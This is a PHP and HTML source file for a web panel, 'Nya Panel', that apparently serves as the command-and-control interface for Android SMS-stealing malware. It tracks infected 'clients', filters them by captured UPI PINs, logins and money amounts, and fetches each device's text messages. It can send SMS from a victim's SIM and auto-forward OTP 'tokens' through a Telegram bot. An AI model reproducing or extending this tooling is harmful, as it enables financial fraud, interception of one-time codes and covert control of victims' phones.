<?php
require_once __DIR__ . '/rebel_bot_lib.php';

if (isset($_GET['rebel_firebase_api']) || isset($_POST['rebel_firebase_api'])) {
  rebel_firebase_api_handle(false);
}
$serverProjects = rebel_firebase_list();

if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
  if (!is_array($body)) $body = [];
  $result = rebel_send_sms_to_device(
    rtrim(trim((string)($body['database_url'] ?? '')), '/'),
    trim((string)($body['auth_key'] ?? '')),
    trim((string)($body['device_id'] ?? '')),
    max(1, (int)($body['sim'] ?? 1)),
    trim((string)($body['to'] ?? '')),
    trim((string)($body['message'] ?? '')),
    strtolower(trim((string)($body['schema'] ?? 'rabel'))),
    trim((string)($body['device_node'] ?? 'clients'))
  );
  rebel_json_out($result, !empty($result['ok']) ? 200 : 502);
}

if (isset($_GET['rebel_fetch_sms']) || isset($_POST['rebel_fetch_sms'])) {
  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
  if (!is_array($body)) $body = [];
  $result = rebel_fetch_sms_for_device(
    rtrim(trim((string)($body['database_url'] ?? '')), '/'),
    trim((string)($body['auth_key'] ?? '')),
    trim((string)($body['device_id'] ?? '')),
    strtolower(trim((string)($body['schema'] ?? 'rabel'))),
    trim((string)($body['device_node'] ?? 'clients')),
    trim((string)($body['composite_id'] ?? ''))
  );
  rebel_json_out($result, !empty($result['ok']) ? 200 : 502);
}

if (isset($_GET['rebel_apk_extract']) || isset($_POST['rebel_apk_extract'])) {
  rebel_apk_extract_api_handle();
}

if (isset($_GET['rebel_sms_token_api']) || isset($_POST['rebel_sms_token_api'])) {
  rebel_sms_token_api_handle();
}

if (isset($_GET['rebel_bot_webhook'])) {
  $raw = file_get_contents('php://input');
  $update = json_decode($raw ?: '{}', true);
  if (is_array($update)) {
    rebel_bot_handle_update($update);
  }
  rebel_json_out(['ok' => true]);
}

header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"/>
<meta name="theme-color" content="#adcf9f"/>
<title>BrM — Nya Panel</title>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<style>
:root{
  --main:#adcf9f;--card:#d2edc6;--card-border:#546b4d;
  --black:#000;--pin:#9c27b0;--offline:#f00;--online:#005509;
  --muted:#454545;--hint:#888;--detail:#ac0000;
}
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html{height:auto;min-height:100%;-webkit-text-size-adjust:100%}
body{
  min-height:100%;width:100%;position:relative;
  font-family:sans-serif;background:var(--main);color:var(--black);
  overflow-x:hidden;overflow-y:scroll;
  -webkit-overflow-scrolling:touch;
  touch-action:pan-y;
}
.page{display:none;width:100%;min-height:0;padding-bottom:max(24px,env(safe-area-inset-bottom))}
.page.active{display:block}
.hdr-block{background:var(--main);padding:12px 0 8px;position:sticky;top:0;z-index:30;box-shadow:0 2px 0 rgba(0,0,0,.06)}
.hdr-row{display:flex;align-items:center;justify-content:space-between;padding:0 16px 8px;gap:8px}
.hdr-title{font-size:20px;font-weight:800;text-align:center;flex:1}
.hdr-title.big{font-size:25px;text-align:left;padding-left:16px}
.icon-btn{background:none;border:none;min-width:40px;min-height:40px;cursor:pointer;font-size:22px;display:flex;align-items:center;justify-content:center;touch-action:manipulation}
.upi-line{font-size:20px;font-weight:800;padding:0 16px 8px}
.btn-row{display:flex;gap:8px;padding:8px;margin:0 8px}
.btn-row .nya-btn{flex:1;min-height:44px;border:1px solid var(--black);border-radius:10px;background:var(--black);color:var(--main);font-size:12px;font-weight:700;cursor:pointer;touch-action:manipulation}
.btn-row .nya-btn.wide{font-size:14px}
.search-row{display:flex;align-items:center;padding:0 16px 12px;gap:8px}
.search-box{flex:1;min-height:45px;border-radius:20px;border:1px solid var(--card);background:var(--card);padding:0 14px;font-size:16px;color:var(--black);outline:none}
.search-box::placeholder{color:var(--hint)}
.list-wrap{width:100%;padding-bottom:max(24px,env(safe-area-inset-bottom))}

.dev-card{margin:5px 15px;border-radius:20px;background:var(--card-border);box-shadow:0 8px 24px rgba(0,0,0,.25);overflow:hidden;cursor:pointer;touch-action:manipulation}
.dev-card-inner{background:var(--card);min-height:150px;padding:8px 12px;display:grid;grid-template-columns:60px 1fr auto;grid-template-rows:auto auto auto auto;gap:4px 10px}
.dev-count{font-size:15px;font-weight:800;grid-column:1;grid-row:1;margin-top:8px}
.dev-like{width:60px;height:60px;grid-column:1;grid-row:2;display:flex;align-items:center;justify-content:center;font-size:36px;touch-action:manipulation}
.dev-like.liked{color:#e91e63}
.dev-info{grid-column:2;grid-row:1/3;font-size:16px;font-weight:700;line-height:1.45;white-space:pre-line;padding-top:8px}
.dev-status{grid-column:3;grid-row:1;font-size:20px;font-weight:800;text-shadow:1px 1px 2px rgba(0,0,0,.3)}
.dev-status.offline{color:var(--offline)}.dev-status.online{color:var(--online)}
.dev-del{grid-column:3;grid-row:2;font-size:24px;padding:4px;touch-action:manipulation}
.dev-pin{grid-column:1/3;grid-row:3;font-size:18px;font-weight:800;color:var(--pin)}
.dev-check{grid-column:3;grid-row:3;font-size:14px;font-weight:800;color:var(--pin);display:flex;align-items:center;gap:4px}
.dev-check input{width:18px;height:18px;accent-color:var(--pin)}
.dev-time{grid-column:2/4;grid-row:4;font-size:12px;font-weight:700;color:var(--muted);text-align:right}

.empty{padding:40px 20px;text-align:center;font-weight:700;color:var(--muted)}
.loading-overlay{position:fixed;inset:0;background:rgba(255,255,255,.5);display:none;align-items:center;justify-content:center;z-index:100;pointer-events:none}
.loading-overlay.show{display:flex;pointer-events:auto}
.spinner{width:60px;height:60px;border:5px solid var(--card-border);border-top-color:var(--black);border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

.sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:50;opacity:0;pointer-events:none}
.sheet-bg.open{opacity:1;pointer-events:auto}
.sheet{position:fixed;left:0;right:0;bottom:0;z-index:51;background:var(--card);border-radius:20px 20px 0 0;padding:16px;max-height:75vh;overflow-y:auto;-webkit-overflow-scrolling:touch;transform:translateY(100%);transition:.28s}
.sheet.open{transform:translateY(0)}
.sheet h3{font-size:16px;margin-bottom:12px}
.fb-item{padding:12px;border:1px solid var(--card-border);border-radius:12px;margin-bottom:8px;background:#fff;cursor:pointer}
.fb-item.active{border-color:var(--black);background:var(--main)}
.fb-item small{display:block;color:var(--muted);font-size:11px;margin-top:4px;word-break:break-all}
.sheet input{width:100%;padding:12px;margin:6px 0;border-radius:12px;border:1px solid var(--card-border);font-size:14px}
.sheet .nya-btn{width:100%;margin-top:8px;min-height:44px;background:var(--black);color:var(--main);border-radius:10px;border:1px solid var(--black);font-weight:700}

/* Device detail — activity_main2 */
.detail-hdr{display:flex;align-items:center;gap:8px;padding:8px 12px;background:var(--main);position:sticky;top:0;z-index:31}
.detail-hdr .back{font-size:28px;background:none;border:none;cursor:pointer;padding:4px}
.detail-hdr .title{flex:1;font-size:24px;font-weight:800;text-align:center}
.detail-hdr .status{font-size:20px;font-weight:800}
.detail-hdr .status.offline{color:var(--offline)}
.detail-line{height:2px;background:#a3a3a3;margin:0}
.detail-body{padding:16px 24px;color:var(--detail);font-size:16px;font-weight:700;line-height:1.6;white-space:pre-line}
.detail-actions{padding:0 16px 12px;display:flex;flex-wrap:wrap;gap:8px;align-items:center}
.detail-actions input,.detail-actions textarea{flex:1;min-width:140px;padding:10px;border:1px solid var(--black);border-radius:8px;font-size:15px}
.detail-actions .nya-btn{min-height:40px;padding:0 16px;background:var(--black);color:var(--main);border-radius:8px;border:1px solid var(--black);font-weight:700;cursor:pointer}
.sim-row{display:flex;gap:8px;padding:0 16px 8px}
.sim-row .nya-btn{flex:1}

.sms-card{margin:4px 8px;border-radius:20px;background:var(--card-border);box-shadow:0 4px 16px rgba(0,0,0,.15)}
.sms-inner{background:var(--card);padding:10px 16px;display:flex;gap:10px;align-items:flex-start}
.sms-icon{font-size:40px;flex-shrink:0}
.sms-body{flex:1;font-size:14px;color:var(--black);word-break:break-word}
.sms-meta{font-size:12px;font-weight:700;color:var(--muted);margin-top:6px}
.toast-wrap{position:fixed;top:12px;left:12px;right:12px;z-index:200;pointer-events:none}
.toast{padding:12px;border-radius:12px;background:#fff;border:1px solid var(--card-border);font-size:13px;margin-bottom:8px;box-shadow:0 4px 12px rgba(0,0,0,.15)}
.token-row{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:12px;margin:8px 0;border-radius:12px;background:#fff;border:1px solid var(--card-border);cursor:pointer;touch-action:manipulation;font-weight:700;font-size:14px}
.token-row .sub{display:block;color:var(--muted);font-size:11px;font-weight:400;margin-top:4px;line-height:1.3}
.toggle{width:48px;height:28px;border-radius:100px;background:#bbb;position:relative;flex-shrink:0;transition:background .2s}
.toggle.on{background:var(--online)}
.toggle::after{content:'';position:absolute;top:3px;left:3px;width:22px;height:22px;border-radius:50%;background:#fff;transition:transform .2s;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.toggle.on::after{transform:translateX(20px)}
.token-status{font-size:12px;padding:0 4px 10px;color:var(--muted);line-height:1.45}
.token-log-wrap{max-height:200px;overflow-y:auto;margin:8px 0;-webkit-overflow-scrolling:touch}
.token-log{font-size:12px;padding:8px 10px;margin:4px 0;border-radius:10px;background:#fff;border:1px solid var(--card-border);word-break:break-word;line-height:1.35}
.token-log.ok{border-color:var(--online)}
.token-log.bad{border-color:var(--offline);color:var(--detail)}
.empty-mini{padding:14px;text-align:center;color:var(--muted);font-size:13px}
.token-fields{padding:0 4px 8px}
.token-fields label{display:block;font-size:12px;font-weight:700;color:var(--muted);margin:8px 0 4px;padding-left:4px}
.token-fields input{width:100%;padding:12px;margin:0 0 6px;border-radius:12px;border:1px solid var(--card-border);font-size:14px;background:#fff}
.token-btn-row{display:flex;gap:8px;margin:8px 0}
.token-btn-row .nya-btn{flex:1;min-height:42px;font-size:12px}
.token-btn-row .nya-btn.active{background:var(--online);color:#fff;border-color:var(--online)}
.token-device-info{margin:0 4px 12px;padding:12px 14px;border-radius:12px;background:#fff;border:1px solid var(--card-border);font-size:14px;font-weight:700;line-height:1.45}
.token-device-info small{display:block;font-size:12px;font-weight:400;color:var(--muted);margin-top:4px}
.sheet.device-setup{max-height:88vh}
</style>
</head>
<body>

<!-- HOME activity_main -->
<div id="view-home" class="page active">
  <div class="hdr-block">
    <div class="hdr-row">
      <span style="width:40px"></span>
      <div class="hdr-title" id="totalClients">Total Clients:-</div>
      <button type="button" class="icon-btn" onclick="openAutoTokenSheet()" title="Auto Token">⚡</button>
      <button type="button" class="icon-btn" onclick="openFbSheet()" title="Firebase">🔥</button>
    </div>
    <div class="btn-row">
      <button type="button" class="nya-btn" onclick="showPage('liked')">Liked ❤️</button>
      <button type="button" class="nya-btn" onclick="showPage('online')">Online🟢</button>
      <button type="button" class="nya-btn" onclick="showPage('onlypin')">Only PIN📍</button>
    </div>
    <div class="search-row">
      <input class="search-box" id="searchHome" placeholder="Search clients..." oninput="renderDevices()"/>
      <button type="button" class="icon-btn" onclick="refreshData()">🔄</button>
    </div>
    <div class="btn-row">
      <button type="button" class="nya-btn wide" onclick="showPage('money')">Money 💰</button>
      <button type="button" class="nya-btn" onclick="showPage('login')">Login👨🏻‍💻</button>
      <button type="button" class="nya-btn" onclick="deleteChecked()">Delete🗑️</button>
    </div>
  </div>
  <div class="list-wrap" id="devList"></div>
</div>

<!-- ONLINE online.xml -->
<div id="view-online" class="page">
  <div class="hdr-block">
    <div class="hdr-row">
      <button type="button" class="nya-btn wide" style="width:150px" onclick="showPage('home')">Home 🏡</button>
      <div class="hdr-title big" id="panelTitleOnline">Android Management XYZ</div>
      <button type="button" class="icon-btn" onclick="refreshData()">🔄</button>
    </div>
    <div class="upi-line" id="activeCount">Active🟢:-</div>
    <div class="search-row">
      <input class="search-box" id="searchOnline" placeholder="Search Online clients..." oninput="renderDevices()"/>
      <button type="button" class="icon-btn" onclick="renderDevices()">🔍</button>
    </div>
  </div>
  <div class="list-wrap" id="devListOnline"></div>
</div>

<!-- ONLY PIN onlypin.xml -->
<div id="view-onlypin" class="page">
  <div class="hdr-block">
    <div class="hdr-row">
      <button type="button" class="nya-btn wide" style="width:150px" onclick="showPage('home')">Home 🏡</button>
      <div class="hdr-title big" id="panelTitlePin">Android Management XYZ</div>
      <button type="button" class="icon-btn" onclick="refreshData()">🔄</button>
    </div>
    <div class="upi-line" id="upiPinCount">UPI PIN:-</div>
    <div class="search-row">
      <input class="search-box" id="searchPin" placeholder="Search Only Pin clients..." oninput="renderDevices()"/>
      <button type="button" class="icon-btn" onclick="renderDevices()">🔍</button>
    </div>
  </div>
  <div class="list-wrap" id="devListPin"></div>
</div>

<!-- LIKED liked.xml -->
<div id="view-liked" class="page">
  <div class="hdr-block">
    <div class="hdr-row">
      <span style="font-size:36px;padding-left:8px">❤️</span>
      <div class="hdr-title" id="likedCount">Liked Clients:-</div>
      <button type="button" class="icon-btn" onclick="refreshData()">🔄</button>
    </div>
    <div style="text-align:center;padding:8px">
      <button type="button" class="nya-btn wide" style="width:150px;margin:0 auto" onclick="showPage('home')">Home 🏡</button>
    </div>
    <div class="search-row">
      <input class="search-box" id="searchLiked" placeholder="Search Liked clients..." oninput="renderDevices()"/>
      <button type="button" class="icon-btn" onclick="renderDevices()">🔍</button>
    </div>
  </div>
  <div class="list-wrap" id="devListLiked"></div>
</div>

<!-- LOGIN logged.xml -->
<div id="view-login" class="page">
  <div class="hdr-block">
    <div class="hdr-row">
      <button type="button" class="nya-btn wide" style="width:150px" onclick="showPage('home')">Home 🏡</button>
      <div class="hdr-title big" id="panelTitleLogin">Android Management XYZ</div>
      <button type="button" class="icon-btn" onclick="refreshData()">🔄</button>
    </div>
    <div class="upi-line" id="loggedCount">Logged in📲:-</div>
    <div class="search-row">
      <input class="search-box" id="searchLogin" placeholder="Search Logged-in clients..." oninput="renderDevices()"/>
      <button type="button" class="icon-btn" onclick="renderDevices()">🔍</button>
    </div>
  </div>
  <div class="list-wrap" id="devListLogin"></div>
</div>

<!-- MONEY money.xml -->
<div id="view-money" class="page">
  <div class="hdr-block">
    <div class="hdr-row">
      <button type="button" class="nya-btn wide" style="width:120px" onclick="showPage('home')">Home 🏡</button>
      <div class="hdr-title" id="moneyTotal">Total:-</div>
      <span style="width:40px"></span>
    </div>
    <div class="btn-row">
      <button type="button" class="nya-btn" onclick="setMoneyFilter('amount')">Amount 💵</button>
      <button type="button" class="nya-btn" onclick="setMoneyFilter('active')">Active 🟢</button>
    </div>
    <div class="search-row">
      <input class="search-box" id="searchMoney" placeholder="Search liked clients..." oninput="renderMoneyView()"/>
      <button type="button" class="icon-btn" onclick="renderMoneyView()">🔍</button>
    </div>
  </div>
  <div class="list-wrap" id="devListMoney"></div>
</div>

<!-- DEVICE DETAIL activity_main2 -->
<div id="view-device" class="page">
  <div class="detail-hdr">
    <button type="button" class="back" onclick="closeDeviceDetail()">←</button>
    <div class="title" id="deviceDetailTitle">Device</div>
    <div class="status offline" id="deviceDetailStatus">Offline</div>
  </div>
  <div class="detail-line"></div>
  <div class="detail-body" id="deviceDetailBody">Loading…</div>
  <div class="detail-actions">
    <input id="updateMoney" placeholder="Update Money"/>
    <button type="button" class="nya-btn" onclick="saveDeviceMoney()">Done</button>
  </div>
  <div class="detail-actions">
    <input id="smsTo" placeholder="Enter recipient phone number" style="flex:2"/>
  </div>
  <div class="detail-actions">
    <textarea id="smsBody" rows="2" placeholder="Enter SMS body" style="width:100%"></textarea>
  </div>
  <div class="sim-row">
    <button type="button" class="nya-btn" onclick="sendDeviceSms(1)">Sim1</button>
    <button type="button" class="nya-btn" onclick="sendDeviceSms(2)">Sim2</button>
    <button type="button" class="nya-btn" onclick="setupAutoTokenFromDevice()">⚡ Auto Token</button>
  </div>
  <div class="search-row">
    <input class="search-box" id="searchDevice" placeholder="Search clients..." oninput="renderDeviceSmsList()"/>
    <button type="button" class="icon-btn" onclick="renderDeviceSmsList()">🔍</button>
  </div>
  <div class="list-wrap" id="devListDeviceSms"></div>
</div>

<div class="loading-overlay" id="loading"><div class="spinner"></div></div>
<div class="toast-wrap" id="toasts"></div>

<div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
<div class="sheet" id="fbSheet">
  <h3>🔥 Firebase Projects</h3>
  <div id="fbSheetList"></div>
  <input id="fbAddName" placeholder="Project name"/>
  <input id="fbAddUrl" placeholder="https://xxx.firebaseio.com"/>
  <input id="fbAddApiKey" placeholder="API key (optional)"/>
  <button type="button" class="nya-btn wide" onclick="addFirebaseProject()">+ Add Firebase</button>
</div>

<div class="sheet-bg" id="tokenSheetBg" onclick="closeAutoTokenSheet()"></div>
<div class="sheet" id="autoTokenSheet">
  <h3>⚡ Auto Token SMS</h3>
  <div class="token-status" id="autoTokenStatus">Telegram bot + channel ID yahan se set karo</div>
  <div class="token-fields">
    <label for="tgBotToken">Telegram Bot Token</label>
    <input id="tgBotToken" type="password" placeholder="123456789:ABCdef..." autocomplete="off"/>
    <label for="tgChannelId">Channel ID</label>
    <input id="tgChannelId" type="text" placeholder="-1001234567890" inputmode="numeric"/>
    <label for="tgOwnerId">Owner Telegram ID (optional)</label>
    <input id="tgOwnerId" type="text" placeholder="8432393497" inputmode="numeric"/>
    <div class="token-btn-row">
      <button type="button" class="nya-btn" onclick="saveTelegramSettings()">💾 Save</button>
      <button type="button" class="nya-btn" onclick="setupAutoTokenWebhook()">🔗 Webhook</button>
    </div>
  </div>
  <div class="token-row" onclick="toggleAutoToken()">
    <div>Auto Token SMS<div class="sub">Channel / message se OTP auto bhejo</div></div>
    <div class="toggle" id="autoTokenToggle"></div>
  </div>
  <div class="token-row" onclick="useSelForAutoToken()">
    <div>Set Device<div class="sub" id="autoTokenDevice">Koi device select nahi</div></div>
    <span>📱</span>
  </div>
  <button type="button" class="nya-btn wide" onclick="refreshAutoTokenLog()">↻ Refresh Log</button>
  <div class="token-log-wrap" id="autoTokenLog"><div class="empty-mini">No activity yet</div></div>
</div>

<div class="sheet-bg" id="deviceSetupBg" onclick="closeAutoTokenDeviceSetup()"></div>
<div class="sheet device-setup" id="autoTokenDeviceSheet">
  <h3>⚡ Auto Token — Full Setup</h3>
  <div class="token-device-info" id="autoTokenDeviceInfo">
    <span id="autoTokenDevicePhone">Device</span>
    <small id="autoTokenDeviceMeta">Tap Save & Enable when done</small>
  </div>
  <div class="token-fields">
    <label for="devTgBotToken">Telegram Bot Token</label>
    <input id="devTgBotToken" type="password" placeholder="123456789:ABCdef..." autocomplete="off"/>
    <label for="devTgChannelId">Channel ID</label>
    <input id="devTgChannelId" type="text" placeholder="-1001234567890" inputmode="numeric"/>
    <label for="devTgOwnerId">Owner Telegram ID (optional)</label>
    <input id="devTgOwnerId" type="text" placeholder="8432393497" inputmode="numeric"/>
    <label>Send from SIM</label>
    <div class="token-btn-row">
      <button type="button" class="nya-btn dev-at-sim active" id="devAtSim1" onclick="selectAutoTokenDeviceSim(1,this)">Sim 1</button>
      <button type="button" class="nya-btn dev-at-sim" id="devAtSim2" onclick="selectAutoTokenDeviceSim(2,this)">Sim 2</button>
    </div>
    <div class="token-row" onclick="toggleAutoTokenDeviceEnable()" style="margin-top:4px">
      <div>Auto Token ON<div class="sub">Channel se SMS TOKEN aate hi bhejo</div></div>
      <div class="toggle" id="autoTokenDeviceToggle"></div>
    </div>
    <div class="token-btn-row">
      <button type="button" class="nya-btn" onclick="setupAutoTokenDeviceWebhook()">🔗 Webhook</button>
      <button type="button" class="nya-btn" onclick="saveAutoTokenDeviceSetup()">✅ Save & Enable</button>
    </div>
  </div>
  <div class="token-log-wrap" id="autoTokenDeviceLog"><div class="empty-mini">Activity log yahan dikhega</div></div>
</div>

<script>var SERVER_FIREBASES=<?php echo json_encode(array_values($serverProjects), JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;</script>
<script src="firebase_defaults.js"></script>
<script src="nya-firebase.js"></script>
</body>
</html>
